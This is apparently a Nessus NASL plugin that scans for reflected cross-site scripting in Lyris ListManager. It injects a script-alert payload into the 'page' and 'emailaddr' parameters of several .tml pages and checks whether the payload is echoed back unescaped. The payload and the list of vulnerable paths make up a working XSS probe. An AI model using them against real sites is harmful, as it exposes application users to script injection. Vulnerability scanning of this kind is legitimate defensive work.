#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(41625);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(36509);
  script_xref(name:"OSVDB", value:"58463");

  script_name(english:"Lyris ListManager Multiple XSS");
  script_summary(english:"Attempts to exploit multiple XSS vulnerabilities");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server is hosting an application that is affected by\n",
      "multiple cross-site scripting vulnerabilities."
    )
  );

  script_set_attribute(
    attribute:"description",
    value:string(
      "The remote host is running ListManager, a web-based commercial mailing\n",
      "list management application from Lyris.\n",
      "\n",
      "The installed version fails to properly sanitize user-supplied input\n",
      "to multiple parameters / scripts before using it to generate dynamic\n",
      "HTML output, such as :\n",
      "\n",
      "  - /scripts/message/message.tml: 'how_many_back', \n",
      "    'msgdig_targeturl'\n",
      "\n",
      "  - /read/attach_file.tml: 'page'\n",
      "\n",
      "  - /read/attachment_too_large.tml: 'page'\n",
      "\n",
      "  - /read/confirm_file_attach.tml: 'page'\n",
      "\n",
      "  - /read/login/index.tml: 'emailaddr'\n",
      "\n",
      "  - /read/login/sent_password.tml: 'emailaddr'\n",
      "\n",
      "An attacker may be able to leverage these issues to launch cross-site\n",
      "scripting attacks against users of the application.\n",
      "\n",
      "Note that the installed version is likely to be affected by other\n",
      "vulnerabilities, though Nessus has not tested for these."
    )
  );

  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?13503238"
  );

  script_set_attribute(
    attribute:"solution",
    value:"Unknown at this time."
  );

  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N"
  );

  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/09/23"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/09/25"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(1, "The web server itself is prone to XSS attacks.");

banner = get_http_banner(port:port);
if (!banner) exit(1, "get_http_banner() returned NULL for port "+port+".");
if (
  banner &&
  (
    "Server: ListManagerWeb/" >!< banner &&
    "Server: Tcl-WebServer" >!< banner
  )
) exit(0, "The banner for port "+port+" is not from ListManager.");


exploit = string('">', "<script>alert('", SCRIPT_NAME, "')</script>");
url_exploit = urlencode(str:exploit);

paths = make_list(
  '/read/attach_file.tml?page=',
  '/read/attachment_too_large.tml?page=',
  '/read/confirm_file_attach.tml?page=',
  '/read/login/index.tml?emailaddr=',
  '/read/login/sent_password.tml?emailaddr='
);

exploit_pats = make_array();
exploit_pats['/read/attach_file.tml?page='] = string('<form action="', exploit, '.tml"');
exploit_pats['/read/attachment_too_large.tml?page='] = string('<form action="', exploit, '.tml" method=post>');
exploit_pats['/read/confirm_file_attach.tml?page='] = string('<form action="', exploit, '.tml" method=post>');
exploit_pats['/read/login/index.tml?emailaddr='] = string('name="emailaddr" value="', exploit, '" size=');
exploit_pats['/read/login/sent_password.tml?emailaddr='] = string(exploit, '</B></font></DIV>');

info = "";
n = 0;
foreach path (paths)
{
  url = string(path, url_exploit);

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server failed to respond.");

  if ('Lyris' >< res[2] &&
      'listmanager' >< res[2] &&
      exploit_pats[path] >< res[2]
  )
  {
    info = info + string("   - ", build_url(port:port, qs:url), "\n");
    n++;

    if (!thorough_tests) break;
  }
}

if (!isnull(info))
{
  if (report_verbosity > 0)
  {
    if (n > 1) s = "Nessus was able to exploit these issues using the following URLs :\n";
    else s = "Nessus was able to exploit this issue using the following URL :\n:";

    report = string(
      "\n",
      s,
      "\n",
      info
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port:port);
  set_kb_item(name:'www/'+port+'XSS', value:TRUE);
  exit(0);
}
